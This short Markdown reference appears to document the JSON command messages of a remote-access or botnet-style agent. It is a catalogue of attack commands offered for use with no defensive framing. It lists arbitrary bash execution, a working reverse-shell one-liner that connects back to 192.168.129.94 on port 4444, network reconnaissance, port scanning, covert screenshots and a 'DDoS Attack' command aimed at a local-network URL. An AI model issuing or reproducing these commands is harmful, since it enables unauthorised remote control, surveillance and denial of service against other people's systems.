# Command Overview

### 1. **Execute Bash Command**
```json
{
    "command": "execute_bash_command",
    "requirements": [],
    "bash_command": "dir"
}
```

### 2. **Execute Reverse Shell Command**
```json
{
    "command": "execute_bash_command",
    "requirements": [],
    "bash_command": "/bin/bash -i >& /dev/tcp/192.168.129.94/4444 0>&1"
}
```

### 3. **Network Information**
```json
{
    "command": "network_info",
    "requirements": ["psutil"]
}
```

### 4. **Port Scan**
```json
{
    "command": "port_scan",
    "requirements": []
}
```

### 5. **Take Screenshot**
```json
{
    "command": "take_screenshot",
    "requirements": ["Pillow"]
}
```

### 6. **DDoS Attack**
```json
{
    "command": "ddos_attack",
    "target_url": "http://192.168.129.105:8000",
    "request_count": 1000
}
```
